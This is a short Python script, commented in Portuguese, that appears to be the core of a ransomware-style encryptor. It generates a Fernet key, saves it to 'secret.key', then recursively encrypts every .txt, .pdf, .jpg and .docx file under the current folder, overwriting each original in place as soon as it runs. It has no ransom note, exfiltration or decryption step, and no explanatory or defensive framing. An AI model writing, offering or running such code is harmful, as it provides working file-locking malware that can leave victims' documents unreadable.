from cryptography.fernet import Fernet
import os

# Gera e salva uma chave
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# Carrega a chave do arquivo
def load_key():
    return open("secret.key", "rb").read()

# Lista de extensões que podem ser criptografadas
ALLOWED_EXTENSIONS = [".txt", ".pdf", ".jpg", ".docx"]

# Função de criptografia
def encrypt_files(directory, key):
    fernet = Fernet(key)

    for root, dirs, files in os.walk(directory):
        for file in files:
            # Verifica se o arquivo tem uma extensão permitida
            if not any(file.lower().endswith(ext) for ext in ALLOWED_EXTENSIONS):
                continue

            filepath = os.path.join(root, file)
            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                encrypted = fernet.encrypt(data)
                with open(filepath, "wb") as f:
                    f.write(encrypted)
                print(f"[+] Encrypted: {filepath}")
            except Exception as e:
                print(f"[!] Failed to encrypt {filepath}: {e}")

if __name__ == "__main__":
    generate_key()
    key = load_key()
    target_folder = "."  # Pasta atual
    encrypt_files(target_folder, key)
